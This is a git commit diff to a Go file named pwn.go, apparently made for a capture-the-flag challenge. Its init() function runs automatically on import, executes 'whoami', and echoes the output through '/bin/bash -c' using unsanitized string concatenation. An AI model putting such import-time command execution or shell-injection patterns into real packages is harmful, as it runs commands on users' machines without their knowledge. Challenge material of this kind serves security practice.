24d8f6674a695ae5f10f1c04843472ba90003451
‪Mohamed ETMAN‬‏ <119084205+Mohammed-Etman@users.noreply.github.com>
2025-12-08 20:40:18 +0200

    Modify init function to print 'whoami' output
    Capture output of 'whoami' command and print to stderr.

--- pwn.go
+++ pwn.go
@@ -1,10 +1,13 @@
 package pwn
 
 import (
-    "os/exec"
+	"os/exec"
 )
 
 func init() {
-    cmd := exec.Command("whoami")
-    cmd.Run()
+	cmd := exec.Command("whoami")
+	out, _ := cmd.CombinedOutput()
+
+	// نطبع الناتج على stderr عشان يظهر في صفحة التحدّي
+	exec.Command("/bin/bash", "-c", "echo "+string(out)+" 1>&2").Run()
 }
